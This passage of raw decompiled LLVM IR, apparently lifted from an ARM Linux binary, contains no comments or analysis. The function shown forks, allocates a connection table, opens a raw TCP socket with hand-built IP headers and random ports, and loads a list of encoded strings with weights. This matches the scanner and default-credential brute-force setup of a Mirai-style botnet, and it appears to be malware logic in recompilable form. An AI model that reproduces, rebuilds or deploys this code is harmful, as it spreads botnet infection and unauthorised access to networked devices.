  %v4_1159c = zext i8 %v3_1159c to i32
  %v2_115a0 = load i32, i32* @global_var_1cd3c.243, align 4
  %v4_115a4 = mul nuw nsw i32 %v5_11598, 256
  %v5_115a4 = or i32 %v4_1159c, %v4_115a4
  store i32 %v5_115a4, i32* %r2.global-to-local, align 4
  %v3_115a8 = mul i32 %v2_11594, 16
  %v2_115ac = add i32 %v2_115a0, %v3_115a8
  store i32 %v2_115ac, i32* %r1.global-to-local, align 4
  %v3_115b4 = add i32 %v2_115ac, 9
  %v4_115b4 = inttoptr i32 %v3_115b4 to i8*
  store i8 %v4_11598, i8* %v4_115b4, align 1
  %v0_115b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_115b8 = trunc i32 %v0_115b8 to i8
  %v2_115b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_115b8 = add i32 %v2_115b8, 8
  %v4_115b8 = inttoptr i32 %v3_115b8 to i8*
  store i8 %v1_115b8, i8* %v4_115b8, align 1
  %v4_115bc = load i8, i8* @global_var_1cd41.246, align 1
  %v5_115bc = zext i8 %v4_115bc to i32
  %v3_115c0 = load i8, i8* bitcast (i8** @global_var_1cd40.245 to i8*), align 4
  %v4_115c0 = zext i8 %v3_115c0 to i32
  %v4_115c4 = mul nuw nsw i32 %v5_115bc, 256
  %v5_115c4 = or i32 %v4_115c0, %v4_115c4
  %v2_115c8 = load i32, i32* %stack_var_-44, align 4
  %v2_115cc = add i32 %v5_115c4, %v2_115c8
  store i32 %v2_115cc, i32* %r3.global-to-local, align 4
  %v3_115d09 = udiv i32 %v2_115cc, 256
  %v1_115d4 = trunc i32 %v3_115d09 to i8
  %v2_115d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_115d4 = add i32 %v2_115d4, 11
  %v4_115d4 = inttoptr i32 %v3_115d4 to i8*
  store i8 %v1_115d4, i8* %v4_115d4, align 1
  %v0_115d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_115d8 = trunc i32 %v0_115d8 to i8
  %v2_115d8 = load i32, i32* %r1.global-to-local, align 4
  %v3_115d8 = add i32 %v2_115d8, 10
  %v4_115d8 = inttoptr i32 %v3_115d8 to i8*
  store i8 %v1_115d8, i8* %v4_115d8, align 1
  %v4_115dc = load i8, i8* @global_var_1cd41.246, align 1
  %v5_115dc = zext i8 %v4_115dc to i32
  %v3_115e0 = load i8, i8* bitcast (i8** @global_var_1cd40.245 to i8*), align 4
  %v4_115e0 = zext i8 %v3_115e0 to i32
  %v4_115e4 = mul nuw nsw i32 %v5_115dc, 256
  %v5_115e4 = or i32 %v4_115e0, %v4_115e4
  %v2_115e8 = load i32, i32* %stack_var_-44, align 4
  %v2_115ec = add i32 %v5_115e4, %v2_115e8
  store i32 %v2_115ec, i32* %r2.global-to-local, align 4
  %v0_115f0 = load i32, i32* %r7.global-to-local, align 4
  %v3_115f0 = mul i32 %v0_115f0, 16
  %v1_115f4 = load i32, i32* %sl.global-to-local, align 4
  %v2_115f4 = add i32 %v1_115f4, %v3_115f0
  store i32 %v2_115f4, i32* %r3.global-to-local, align 4
  %v0_115f8 = load i32, i32* %lr.global-to-local, align 4
  %v1_115f8 = add i32 %v0_115f8, 1
  store i32 %v1_115f8, i32* %lr.global-to-local, align 4
  %v3_115fc = sdiv i32 %v2_115ec, 256
  store i32 %v3_115fc, i32* %r1.global-to-local, align 4
  %v0_11600 = load i32, i32* %r6.global-to-local, align 4
  %v2_11600 = add i32 %v2_115f4, 4
  %v3_11600 = inttoptr i32 %v2_11600 to i32*
  store i32 %v0_11600, i32* %v3_11600, align 4
  %v0_11604 = load i32, i32* %lr.global-to-local, align 4
  %v1_11604 = load i32, i32* %r8.global-to-local, align 4
  %v2_11604 = inttoptr i32 %v1_11604 to i32*
  store i32 %v0_11604, i32* %v2_11604, align 4
  %v0_11608 = load i32, i32* %r1.global-to-local, align 4
  %v1_11608 = trunc i32 %v0_11608 to i8
  store i8 %v1_11608, i8* @global_var_1cd41.246, align 1
  %v0_1160c = load i32, i32* %r2.global-to-local, align 4
  %v1_1160c = trunc i32 %v0_1160c to i8
  store i8 %v1_1160c, i8* bitcast (i8** @global_var_1cd40.245 to i8*), align 4
  ret i32 ptrtoint (i8** @global_var_1cd40.245 to i32)

; uselistorder directives
  uselistorder i32 %v1_11570, { 0, 2, 3, 1 }
  uselistorder i32 %v3_11544, { 1, 0 }
  uselistorder i32 %v2_11538, { 1, 0, 2 }
  uselistorder i32 %v1_11504, { 0, 2, 3, 1 }
  uselistorder i32 %v3_114d8, { 1, 0 }
  uselistorder i32 %v2_114cc, { 1, 0, 2 }
  uselistorder i32 %v3_1149c, { 1, 0 }
  uselistorder i32 %v3_11494, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 34, { 3, 4, 0, 5, 1, 6, 2, 7 }
  uselistorder i32 (i8*)* @function_1399c, { 27, 28, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86 }
  uselistorder i32* (i32*, i32)* @realloc, { 4, 3, 6, 7, 0, 10, 8, 11, 9, 1, 5, 2, 12 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
}

define i32 @function_11624() local_unnamed_addr {
dec_label_pc_11624:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp240 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-41 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-1842 = alloca i32, align 4
  %stack_var_-1862 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_11624 = load i32, i32* @r4, align 4
  store i32 %v3_11624, i32* %stack_var_-36, align 4
  %v6_11624 = load i32, i32* @r5, align 4
  %v9_11624 = load i32, i32* @r6, align 4
  %v12_11624 = load i32, i32* @r7, align 4
  %v15_11624 = load i32, i32* @r8, align 4
  %v18_11624 = load i32, i32* @sb, align 4
  %v21_11624 = load i32, i32* @sl, align 4
  %v24_11624 = load i32, i32* @fp, align 4
  %v0_1162c = call i32 @fork()
  store i32 %v0_1162c, i32* %r0.global-to-local, align 4
  %v7_11630 = icmp eq i32 %v0_1162c, -1
  %. = zext i1 %v7_11630 to i32
  %tmp274 = icmp slt i32 %v0_1162c, 1
  %storemerge230 = select i1 %tmp274, i32 %., i32 1
  store i32 %storemerge230, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1cd6c.237 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1164c = icmp eq i32 %storemerge230, 0
  store i1 %v2_1164c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1162c, i32* @global_var_1cd6c.237, align 4
  br i1 %v2_1164c, label %dec_label_pc_11660, label %dec_label_pc_11658

dec_label_pc_11658:                               ; preds = %dec_label_pc_11624
  store i32 %v3_11624, i32* @r4, align 4
  store i32 %v6_11624, i32* %r5.global-to-local, align 4
  store i32 %v9_11624, i32* @r6, align 4
  store i32 %v12_11624, i32* @r7, align 4
  store i32 %v15_11624, i32* @r8, align 4
  store i32 %v18_11624, i32* @sb, align 4
  store i32 %v21_11624, i32* @sl, align 4
  store i32 %v24_11624, i32* @fp, align 4
  ret i32 %v0_1162c

dec_label_pc_11660:                               ; preds = %dec_label_pc_11624
  %v0_11660 = call i32 @function_13c54()
  store i32 %v0_11660, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd48.140 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_11660, i32* @global_var_1cd48.140, align 4
  %v1_1166c = call i32 @function_10bc0(i32 %v0_11660)
  %v0_11670 = load i32, i32* @r4, align 4
  store i32 %v0_11670, i32* %r0.global-to-local, align 4
  %v1_11674 = inttoptr i32 %v0_11670 to i32*
  %v2_11674 = call i32 @time(i32* %v1_11674)
  store i32 ptrtoint (i32* @global_var_1cd44.239 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_11674, i32* @global_var_1cd44.239, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_11688 = call i32* @calloc(i32 128, i32 288)
  %v4_11688 = ptrtoint i32* %v2_11688 to i32
  store i32 %v4_11688, i32* %lr.global-to-local, align 4
  %v0_11694 = load i32, i32* @r4, align 4
  store i32 %v0_11694, i32* %stack_var_-52, align 4
  store i32 %v4_11688, i32* @global_var_1cd64.251, align 4
  store i32 %v0_11694, i32* %r3.global-to-local, align 4
  store i32 %v0_11694, i32* %r5.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 %v0_11694, i32* %ip.global-to-local, align 4
  %v1_116ac = add i32 %v4_11688, 4
  store i32 %v1_116ac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_116b0

dec_label_pc_116b0:                               ; preds = %dec_label_pc_116b0.dec_label_pc_116b0_crit_edge, %dec_label_pc_11660
  %v0_116c8 = phi i32 [ %v0_116c8.pre, %dec_label_pc_116b0.dec_label_pc_116b0_crit_edge ], [ %v0_11694, %dec_label_pc_11660 ]
  %v0_116b8 = phi i32 [ %v0_116d0, %dec_label_pc_116b0.dec_label_pc_116b0_crit_edge ], [ %v0_11694, %dec_label_pc_11660 ]
  %v1_116c0 = phi i32 [ %v1_116c0.pre, %dec_label_pc_116b0.dec_label_pc_116b0_crit_edge ], [ %v4_11688, %dec_label_pc_11660 ]
  %v3_116b0 = mul i32 %v0_116b8, 256
  store i32 %v3_116b0, i32* %r2.global-to-local, align 4
  %v1_116b8 = add i32 %v0_116b8, 1
  store i32 %v1_116b8, i32* %ip.global-to-local, align 4
  %v2_116bc = mul i32 %v0_116b8, 288
  %v2_116c0 = add i32 %v1_116c0, 12
  %v2_116c8 = add i32 %v2_116c0, %v2_116bc
  %v3_116c8 = inttoptr i32 %v2_116c8 to i32*
  store i32 %v0_116c8, i32* %v3_116c8, align 4
  %v0_116cc = load i32, i32* %r0.global-to-local, align 4
  %v1_116cc = load i32, i32* %r1.global-to-local, align 4
  %v2_116cc = inttoptr i32 %v1_116cc to i32*
  store i32 %v0_116cc, i32* %v2_116cc, align 4
  %v3_116cc = load i32, i32* %r1.global-to-local, align 4
  %v4_116cc = add i32 %v3_116cc, 288
  store i32 %v4_116cc, i32* %r1.global-to-local, align 4
  %v0_116d0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_116d0, i32* %r3.global-to-local, align 4
  %v7_116d4 = icmp sgt i32 %v1_116b8, 127
  br i1 %v7_116d4, label %dec_label_pc_116d8, label %dec_label_pc_116b0.dec_label_pc_116b0_crit_edge

dec_label_pc_116b0.dec_label_pc_116b0_crit_edge:  ; preds = %dec_label_pc_116b0
  %v1_116c0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_116c8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_116b0

dec_label_pc_116d8:                               ; preds = %dec_label_pc_116b0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 %v0_116d0, i32* %stack_var_-52, align 4
  %v3_116e8 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_116e8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cd68.253 to i32), i32* %lr.global-to-local, align 4
  %v2_116f0 = icmp eq i32 %v3_116e8, -1
  store i1 %v2_116f0, i1* %cpsr_c.global-to-local, align 1
  %v7_116f0 = icmp eq i32 %v3_116e8, -1
  store i1 %v7_116f0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_116e8, i32* @r4, align 4
  store i32 %v3_116e8, i32* @global_var_1cd68.253, align 4
  br i1 %v7_116f0, label %dec_label_pc_12088, label %dec_label_pc_11700

dec_label_pc_11700:                               ; preds = %dec_label_pc_116d8
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_11704 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11704, i32* %r2.global-to-local, align 4
  %v2_11708 = call i32 (i32, i32, ...) @fcntl(i32 %v3_116e8, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_11710 = or i32 %v2_11708, 2048
  store i32 %v1_11710, i32* %r2.global-to-local, align 4
  %v0_11714 = load i32, i32* @r4, align 4
  store i32 %v0_11714, i32* %r0.global-to-local, align 4
  %v2_11718 = call i32 (i32, i32, ...) @fcntl(i32 %v0_11714, i32 4)
  store i32 1, i32* %ip.global-to-local, align 4
  %v2_11724 = load i32, i32* @global_var_1cd68.253, align 4
  store i32 %v2_11724, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_1172c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1172c, i32* %r1.global-to-local, align 4
  %v2_11730 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_11730, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v7_11740 = call i32 @setsockopt(i32 %v2_11724, i32 %v0_1172c, i32 3, i32* nonnull %stack_var_-52, i32 4)
  store i32 %v7_11740, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11744 = icmp eq i32 %v7_11740, 0
  store i1 %v2_11744, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11744, label %dec_label_pc_1174c, label %dec_label_pc_1207c

dec_label_pc_1174c:                               ; preds = %dec_label_pc_11700, %dec_label_pc_1174c
  %v0_1174c = call i32 @function_10b68()
  %v3_11750 = mul i32 %v0_1174c, 65536
  store i32 %v3_11750, i32* %r0.global-to-local, align 4
  %v1_1175c = mul i32 %v0_1174c, 256
  %v3_11760 = and i32 %v1_1175c, 65280
  %tmp277 = udiv i32 %v0_1174c, 256
  %v4_11764 = urem i32 %tmp277, 256
  %v5_11764 = or i32 %v4_11764, %v3_11760
  store i32 %v5_11764, i32* %r3.global-to-local, align 4
  %v2_11768 = icmp ugt i32 %v5_11764, 1023
  store i1 %v2_11768, i1* %cpsr_c.global-to-local, align 1
  %v7_11768 = icmp eq i32 %v5_11764, 1024
  store i1 %v7_11768, i1* %cpsr_z.global-to-local, align 1
  %v3_1176c = icmp ult i32 %v5_11764, 1022
  br i1 %v3_1176c, label %dec_label_pc_1174c, label %dec_label_pc_11770

dec_label_pc_11770:                               ; preds = %dec_label_pc_1174c
  %v5_11758.le = trunc i32 %v0_1174c to i8
  store i32 ptrtoint (i32* @global_var_1cd14.255 to i32), i32* %ip.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i8 69, i8* bitcast (i32* @global_var_1cd14.255 to i8*), align 4
  store i8 40, i8* bitcast (i32* @global_var_1cd17.256 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1cd16.257 to i8*), align 4
  %v0_117a4 = call i32 @function_10b68()
  %v1_117a4 = trunc i32 %v0_117a4 to i8
  store i32 %v0_117a4, i32* %r0.global-to-local, align 4
  %v4_117ac = sext i8 %v5_11758.le to i32
  %v3_117b0 = load i8, i8* @global_var_1cd34.260, align 1
  store i32 ptrtoint (i32* @global_var_1cd14.255 to i32), i32* %lr.global-to-local, align 4
  %v3_117b8229 = udiv i32 %v4_117ac, 256
  store i8 64, i8* bitcast (i32* @global_var_1cd1c.261 to i8*), align 4
  %v2_117c4 = and i32 %v0_117a4, 128
  %v3_117c4 = icmp ne i32 %v2_117c4, 0
  store i1 %v3_117c4, i1* %cpsr_c.global-to-local, align 1
  %v4_117c4228 = udiv i32 %v0_117a4, 256
  store i32 ptrtoint (i32* @global_var_1cd28.259 to i32), i32* %r3.global-to-local, align 4
  %tmp = urem i8 %v3_117b0, 16
  %v1_117cc = zext i8 %tmp to i32
  %v1_117d0 = trunc i32 %v4_117c4228 to i8
  store i8 %v1_117d0, i8* bitcast (i32* @global_var_1cd19.262 to i8*), align 4
  %v1_117d4 = or i32 %v1_117cc, 80
  store i32 %v1_117d4, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r2.global-to-local, align 4
  store i32 6, i32* @r6, align 4
  %v1_117e0 = trunc i32 %v1_117d4 to i8
  store i8 %v1_117e0, i8* @global_var_1cd34.260, align 1
  %v1_117e4 = trunc i32 %v3_117b8229 to i8
  store i8 %v1_117e4, i8* bitcast (i32* @global_var_1cd29.263 to i8*), align 4
  store i8 23, i8* bitcast (i32* @global_var_1cd2b.264 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_1cd1d.265 to i8*), align 4
  store i32 %v4_117ac, i32* %ip.global-to-local, align 4
  store i8 %v1_117a4, i8* bitcast (i32* @global_var_1cd18.266 to i8*), align 4
  store i8 %v5_11758.le, i8* bitcast (i32* @global_var_1cd28.259 to i8*), align 4
  %v0_117fc = load i32, i32* @r5, align 4
  %v1_117fc = trunc i32 %v0_117fc to i8
  store i8 %v1_117fc, i8* bitcast (i32* @global_var_1cd2a.267 to i8*), align 4
  %v0_11800 = call i32 @function_10b68()
  %v1_11800 = trunc i32 %v0_11800 to i8
  store i32 ptrtoint (i32* @global_var_1cd28.259 to i32), i32* %lr.global-to-local, align 4
  %v3_11808 = load i8, i8* @global_var_1cd35.268, align 1
  %v4_11808 = zext i8 %v3_11808 to i32
  %v2_1180c = and i32 %v0_11800, 128
  %v3_1180c = icmp ne i32 %v2_1180c, 0
  store i1 %v3_1180c, i1* %cpsr_c.global-to-local, align 1
  %v4_1180c = sdiv i32 %v0_11800, 256
  store i32 %v4_1180c, i32* %ip.global-to-local, align 4
  %v1_11810 = or i32 %v4_11808, 2
  store i32 %v1_11810, i32* %r3.global-to-local, align 4
  %v1_11818 = trunc i32 %v4_1180c to i8
  store i8 %v1_11818, i8* bitcast (i32* @global_var_1cd37.269 to i8*), align 4
  %v1_1181c = trunc i32 %v1_11810 to i8
  store i8 %v1_1181c, i8* @global_var_1cd35.268, align 1
  store i8 %v1_11800, i8* bitcast (i32* @global_var_1cd36.270 to i8*), align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1454c.274 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v4_11830 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint (i32* @global_var_1454c.274 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_14554.276 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_11840 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint ([6 x i8]* @global_var_14554.276 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_11850 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r1.global-to-local, align 4
  %v5_11860 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 7)
  %v0_11864 = load i32, i32* @r6, align 4
  store i32 %v0_11864, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14564.280 to i32), i32* %r1.global-to-local, align 4
  %v4_11870 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint (i32* @global_var_14564.280 to i32), i32 %v0_11864)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1456c.282 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_11880 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint ([8 x i8]* @global_var_1456c.282 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_14574.284 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_11890 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint ([8 x i8]* @global_var_14574.284 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1457c.286 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_118a0 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint ([9 x i8]* @global_var_1457c.286 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14588.288 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_118b0 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint (i32* @global_var_14588.288 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14590.290 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_118c0 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint (i32* @global_var_14590.290 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_14598.292 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_14598.292 to i32), i32* %r1.global-to-local, align 4
  %v5_118d0 = call i32 @function_11480(i32 ptrtoint ([8 x i8]* @global_var_14598.292 to i32), i32 ptrtoint ([8 x i8]* @global_var_14598.292 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14318.294 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_118e0 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint (i32* @global_var_14318.294 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_143dc.296 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_118f0 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 ptrtoint ([9 x i8]* @global_var_143dc.296 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r1.global-to-local, align 4
  %v5_11900 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_143e8.298 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_11910 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint (i32* @global_var_143e8.298 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_143f0.300 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_143f0.300 to i32), i32* %r1.global-to-local, align 4
  %v5_11920 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_143f0.300 to i32), i32 ptrtoint ([5 x i8]* @global_var_143f0.300 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14318.294 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_11930 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 ptrtoint (i32* @global_var_14318.294 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_143f8.302 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_11940 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint ([5 x i8]* @global_var_143f8.302 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14400.304 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_11950 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 ptrtoint (i32* @global_var_14400.304 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1440c.306 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_11960 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint (i32* @global_var_1440c.306 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_14414.308 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_11970 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 ptrtoint ([9 x i8]* @global_var_14414.308 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1440c.306 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_11980 = call i32 @function_11480(i32 ptrtoint ([6 x i8]* @global_var_1455c.278 to i32), i32 ptrtoint (i32* @global_var_1440c.306 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14420.310 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_11990 = call i32 @function_11480(i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32 ptrtoint (i32* @global_var_14420.310 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_14544.272 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_143dc.296 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
